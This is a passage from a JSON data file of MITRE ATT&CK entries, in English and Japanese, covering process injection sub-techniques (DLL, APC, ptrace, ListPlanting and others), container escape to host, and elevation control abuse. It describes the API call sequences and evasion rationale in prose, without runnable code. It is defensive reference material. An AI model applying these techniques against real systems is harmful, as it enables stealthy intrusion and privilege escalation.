                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、/procファイルシステムを介してプロセスに悪意のあるコードを注入する可能性があります。Procメモリインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nProcメモリインジェクションは、/procファイルシステム（`<code>/proc/[pid]</code>`）を介してプロセスのメモリを列挙し、利用可能なガジェット/命令でリターン指向プログラミング（ROP）ペイロードを作成することを含みます。実行中の各プロセスには、メモリマッピングを含む独自のディレクトリがあります。Procメモリインジェクションは、通常、/procファイルシステムによって提供されるメモリマッピングを使用してターゲットプロセスのスタックを上書きすることによって実行されます。この情報は、アドレス空間配置のランダム化（ASLR）などのプロセスメモリ保護によって隠されているオフセット（スタックを含む）やガジェット（悪意のあるペイロードを構築するために使用できるプログラム内の命令）を列挙するために使用できます。列挙されると、`<code>/proc/[pid]/maps</code>`内のターゲットプロセスのメモリマップはddを使用して上書きできます。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man)\n\n[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)などの他のテクニックを使用して、ターゲットプロセスにより多くの利用可能なガジェットを投入することができます。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、procメモリインジェクションは子プロセス（バックグラウンドで実行されているsleepのコピーなど）をターゲットにする場合があります。(引用: GDS Linux Injection)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。procメモリインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.015",
                        "name_eng": "ListPlanting",
                        "name_jp": "リストプランティング",
                        "description_eng": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
                        "description_jp": "攻撃者は、リストビューコントロールを悪用して、乗っ取ったプロセスに悪意のあるコードを注入し、プロセスベースの防御を回避したり、権限を昇格させたりする可能性があります。ListPlantingは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。(引用: Hexacorn Listplanting) ListPlanting経由で実行されるコードは、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。\n\nリストビューコントロールは、アイテムのコレクションを表示するために使用されるユーザーインターフェイスウィンドウです。(引用: Microsoft List View Controls) アプリケーションのリストビュー設定に関する情報は、プロセスのメモリ内の<code>SysListView32</code>コントロールに保存されます。\n\nListPlanting（メッセージパッシング「シャッター攻撃」の一形態）は、リストビューコントロールを使用するプロセスの仮想アドレス空間にコードをコピーし、そのコードをリストされたアイテムのソート用のカスタムコールバックとして使用することによって実行される場合があります。(引用: Modexp Windows Process Injection) 攻撃者はまず、ターゲットプロセスのメモリス空間にコードをコピーする必要があります。これは、被害者プロセスウィンドウの<code>SysListView32</code>の子へのハンドルを直接取得する（<code>FindWindow</code>や<code>EnumWindows</code>などのWindows API呼び出しを介して）か、他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)メソッドを含むさまざまな方法で実行できます。\n\nListPlantingのいくつかのバリエーションでは、ターゲットプロセスにメモリを割り当てた後、ウィンドウメッセージを使用してペイロードをコピーし、監視の厳しい<code>WriteProcessMemory</code>関数の使用を回避する場合があります。例えば、攻撃者は<code>PostMessage</code>や<code>SendMessage</code> API関数を使用して<code>LVM_SETITEMPOSITION</code>および<code>LVM_GETITEMPOSITION</code>メッセージを送信し、ペイロードを一度に2バイトずつ割り当てられたメモリに効果的にコピーすることができます。(引用: ESET InvisiMole June 2020)\n\n最後に、ペイロードは、プロセスウィンドウの<code>SysListView32</code>の子に<code>LVM_SORTITEMS</code>メッセージを送信することによってトリガーされ、新しく割り当てられたバッファ内のペイロードが<code>ListView_SortItems</code>コールバックとして渡されて実行されます。"
                    },
                    {
                        "id": "T1055.014",
                        "name_eng": "VDSO Hijacking",
                        "name_jp": "VDSOハイジャック",
                        "description_eng": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、VDSOハイジャックを介してプロセスに悪意のあるコードを注入する可能性があります。仮想動的共有オブジェクト（vdso）ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nVDSOハイジャックは、動的にリンクされた共有ライブラリへの呼び出しをリダイレクトすることを含みます。メモリ保護により、[Ptraceシステムコール](https://attack.mitre.org/techniques/T1055/008)を介してプロセスに実行可能コードを書き込むことが妨げられる場合があります。ただし、攻撃者はvdso共有オブジェクトからプロセスにマップされたsyscallインターフェイスコードスタブをハイジャックして、悪意のある共有オブジェクトを開いてマップするためのsyscallを実行する可能性があります。このコードは、プロセスのグローバルオフセットテーブル（マップされたライブラリ関数の絶対アドレスを格納）に格納されているパッチ適用済みのメモリアドレス参照を介してプロセスの実行フローをリダイレクトすることによって呼び出すことができます。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。VDSOハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.005",
                        "name_eng": "Thread Local Storage",
                        "name_jp": "スレッドローカルストレージ",
                        "description_eng": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、スレッドローカルストレージ（TLS）コールバックを介してプロセスに悪意のあるコードを注入する可能性があります。TLSコールバックインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nTLSコールバックインジェクションは、ポータブル実行可能ファイル（PE）内のポインタを操作して、コードの正当なエントリポイントに到達する前にプロセスを悪意のあるコードにリダイレクトすることを含みます。TLSコールバックは通常、スレッドが使用するデータのセットアップやクリーンアップのためにOSによって使用されます。TLSコールバックの操作は、[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)などの他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)テクニックを使用して、プロセスのメモリス空間内の特定のオフセットに割り当てて書き込むことによって実行される場合があります。(引用: FireEye TLS Nov 2017)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。TLSコールバックインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.011",
                        "name_eng": "Extra Window Memory Injection",
                        "name_jp": "ウィンドウ・メモリ・インジェクション",
                        "description_eng": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、追加ウィンドウメモリ（EWM）を介してプロセスに悪意のあるコードを注入する可能性があります。EWMインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nウィンドウを作成する前に、グラフィカルなWindowsベースのプロセスは、外観と動作を規定するウィンドウクラスを規定または登録する必要があります（データの入出力を処理する関数であるウィンドウプロシージャを介して）。(引用: Microsoft Window Classes) 新しいウィンドウクラスの登録には、そのクラスの各インスタンスの割り当て済みメモリに追加される最大40バイトのEWMのリクエストを含めることができます。このEWMは、そのウィンドウに固有のデータを格納することを目的としており、その値を設定および取得するための特定のアプリケーションプログラミングインターフェイス（API）関数を持っています。(引用: Microsoft GetWindowLong function)(引用: Microsoft SetWindowLong function)\n\n小さいながらも、EWMは32ビットポインタを格納するのに十分な大きさであり、ウィンドウプロシージャを指すためによく使用されます。マルウェアは、プロセスのメモリの共有セクションにコードを書き込み、EWMにコードへのポインタを配置し、プロセスのEWM内のアドレスに実行制御を返すことによって実行を呼び出すことを含む攻撃チェーンの一部として、このメモリロケーションを利用する可能性があります。\n\nEWMインジェクションを介して付与された実行は、ターゲットプロセスのメモリと、場合によっては昇格された権限の両方へのアクセスを許可する可能性があります。共有セクションへのペイロードの書き込みは、<code>WriteProcessMemory</code>や<code>CreateRemoteThread</code>などの監視の厳しいAPI呼び出しの使用も回避します。(引用: Elastic Process Injection July 2017) より高度なマルウェアサンプルは、ターゲットプロセスの実行可能部分内に悪意のあるペイロードを書き換えるウィンドウプロシージャと他のシステム関数の組み合わせをトリガーすることによって、データ実行防止（DEP）などの保護メカニズムをバイパスする可能性もあります。(引用: MalwareTech Power Loader Aug 2013)(引用: WeLiveSecurity Gapz and Redyms Mar 2013)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。EWMインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.001",
                        "name_eng": "Dynamic-link Library Injection",
                        "name_jp": "ダイナミックリンク・ライブラリー・インジェクション",
                        "description_eng": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ダイナミックリンクライブラリ（DLL）をプロセスに注入する可能性があります。DLLインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nDLLインジェクションは一般的に、新しいスレッドを呼び出してDLLをロードする前に、ターゲットプロセスの仮想アドレス空間にDLLへのパスを書き込むことによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>（DLLのロードを担当する<code>LoadLibrary</code> APIを呼び出す）で呼び出されます。(引用: Elastic Process Injection July 2017)\n\nリフレクティブDLLインジェクション（自己マッピングDLLをプロセスに書き込む）やメモリモジュール（プロセスへの書き込み時にDLLをマップする）などのこのメソッドのバリエーションは、アドレス再配置の問題や実行を呼び出すための追加のAPIを克服します（これらのメソッドは<code>LoadLibrary</code>の機能を手動で実行することによってメモリ内のファイルをロードして実行するため）。(引用: Elastic HuntingNMemory June 2017)(引用: Elastic Process Injection July 2017)\n\nモジュールストンピング/オーバーロードまたはDLLハロウイングとしばしば呼ばれるこのメソッドの別のバリエーションは、プロセス内に注入されたコードを隠蔽するために活用される可能性があります。このメソッドは、正当なDLLをリモートプロセスにロードし、ターゲットプロセスで新しいスレッドを開始する前にモジュールの<code>AddressOfEntryPoint</code>を手動で上書きすることを含みます。(引用: Module Stomping for Shellcode Injection) このバリエーションにより、攻撃者はディスク上の正当なDLLファイルで実行を潜在的にバックアップすることにより、悪意のある注入コードを隠すことができます。(引用: Hiding Malicious Code with Module Stomping)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。DLLインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.003",
                        "name_eng": "Thread Execution Hijacking",
                        "name_jp": "スレッド実行ハイジャック",
                        "description_eng": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、乗っ取ったプロセスに悪意のあるコードを注入する可能性があります。スレッド実行ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nスレッド実行ハイジャックは、通常、既存のプロセスを中断し、そのメモリをアンマップ/空洞化した後、悪意のあるコードまたはDLLへのパスに置き換えることによって実行されます。既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、プロセスは中断された後、書き込まれ、注入されたコードに再配置され、それぞれ<code>SuspendThread </code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして<code>ResumeThread</code>を介して再開されます。(引用: Elastic Process Injection July 2017)\n\nこれは[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と非常によく似ていますが、中断状態でプロセスを作成するのではなく、既存のプロセスをターゲットにします。\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。スレッド実行ハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.008",
                        "name_eng": "Ptrace System Calls",
                        "name_jp": "Ptraceシステムコール",
                        "description_eng": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ptrace（プロセストレース）システムコールを介してプロセスに悪意のあるコードを注入する可能性があります。Ptraceシステムコールインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nPtraceシステムコールインジェクションは、実行中のプロセスにアタッチして変更することを含みます。ptraceシステムコールにより、デバッグプロセスは、メモリやレジスタ値の変更を含む、別のプロセス（および個々のスレッド）を監視および制御できます。(引用: PTRACE man) Ptraceシステムコールインジェクションは、通常、実行中のプロセスに任意のコード（例: <code>malloc</code>）を書き込み、次にそのメモリを<code>PTRACE_SETREGS</code>で呼び出して、次に実行する命令を含むレジスタを設定することによって実行されます。Ptraceシステムコールインジェクションは、<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>（ターゲットプロセスのメモリ内の特定のアドレス（例: 次の命令の現在のアドレス）にデータをコピーする）でも実行できます。(引用: PTRACE man)(引用: Medium Ptrace JUL 2018)\n\n非子プロセスやより高い権限を持つプロセスをターゲットとする場合、Ptraceシステムコールインジェクションは不可能である可能性があります。(引用: BH Linux Inject)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。ptraceシステムコールインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.004",
                        "name_eng": "Asynchronous Procedure Call",
                        "name_jp": "非同期手続き呼び出し",
                        "description_eng": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、非同期プロシージャコール（APC）キューを介してプロセスに悪意のあるコードを注入する可能性があります。APCインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nAPCインジェクションは、一般的に、プロセスのスレッドのAPCキュー（引用: Microsoft APC）に悪意のあるコードをアタッチすることによって実行されます。キューに入れられたAPC関数は、スレッドが変更可能な状態に入ったときに実行されます。(引用: Microsoft APC) 既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、<code>QueueUserAPC</code>を使用して関数（悪意のあるDLLを指す<code>LoadLibrayA</code>など）を呼び出すことができます。\n\n「アーリーバードインジェクション」と呼ばれるAPCインジェクションの変形は、プロセスのエントリポイント（および潜在的な後続のマルウェア対策フック）の前にAPCを介して悪意のあるコードを書き込んで実行できる中断プロセスを作成することを含みます。(引用: CyberBit Early Bird Apr 2018) AtomBombing（引用: ENSIL AtomBombing Oct 2016）は、以前にグローバルアトムテーブルに書き込まれた悪意のあるコードを呼び出すためにAPCを利用する別の変形です。(引用: Microsoft Atom Table)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。APCインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.002",
                        "name_eng": "Portable Executable Injection",
                        "name_jp": "ポータブル実行可能インジェクション",
                        "description_eng": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ポータブル実行可能ファイル（PE）をプロセスに注入する可能性があります。PEインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nPEインジェクションは、一般的に、新しいスレッドを介して呼び出す前に、コード（ディスク上のファイルなしの場合もある）をターゲットプロセスの仮想アドレス空間にコピーすることによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>または追加のコード（例: シェルコード）で呼び出されます。注入されたコードの変位は、メモリ参照を再マップする機能に対する追加の要件を導入します。(引用: Elastic Process Injection July 2017)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。PEインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    }
                ]
            },
            {
                "id": "T1611",
                "name_eng": "Escape to Host",
                "name_jp": "ホストへのエスケープ",
                "description_eng": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nIn ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",
                "description_jp": "攻撃者は、コンテナまたは仮想化環境から抜け出して、基盤となるホストへのアクセスを取得する可能性があります。これにより、攻撃者はホストレベルから他のコンテナ化または仮想化されたリソース、あるいはホスト自体にアクセスできるようになります。原則として、コンテナ化/仮想化されたリソースは、アプリケーション機能の明確な分離を提供し、ホスト環境から分離されている必要があります。(引用: Docker Overview)\n\n攻撃者がコンテナからホスト環境にエスケープする方法は複数あります。例としては、バインドパラメータを使用してホストのファイルシステムをマウントするように設定されたコンテナを作成し、これにより攻撃者がペイロードをドロップし、ホスト上でcronなどの制御ユーティリティを実行できるようにすることが含まれます。特権コンテナを利用して、基盤となるホスト上でコマンドを実行したり、悪意のあるカーネルモジュールをロードしたりします。あるいは、`unshare`や`keyctl`などのシステムコールを悪用して権限を昇格させ、秘密を盗みます。(引用: Docker Bind Mounts)(引用: Trend Micro Privileged Container)(引用: Intezer Doki July 20)(引用: Container Escape)(引用: Crowdstrike Kubernetes Container Escape)(引用: Keyctl-unmask)\n\nさらに、攻撃者は、`docker.sock`などのマウントされたコンテナ管理ソケットを持つ侵害されたコンテナを悪用して、[コンテナ管理コマンド](https://attack.mitre.org/techniques/T1609)を介してコンテナから抜け出すことができる場合があります。(引用: Container Escape) 攻撃者はまた、ホストマシンのルートディレクトリにアクセスするためにグローバルシンボリックリンクの脆弱性を悪用するなど、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)を介してエスケープする可能性もあります。(引用: Windows Server Containers Are Open)\n\nESXi環境では、攻撃者は脆弱性を悪用して仮想マシンからハイパーバイザにエスケープする可能性があります。(引用: Broadcom VMSA-2025-004)\n\nホストへのアクセスを取得すると、攻撃者は、永続性の確立、環境内での横方向の移動、ホスト上で実行されている他のコンテナや仮想マシンへのアクセス、ホスト上でのコマンドアンドコントロールチャネルの設定など、追跡目標を達成する機会を得る可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1548",
                "name_eng": "Abuse Elevation Control Mechanism",
                "name_jp": "昇格制御メカニズムの悪用",
                "description_eng": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)",
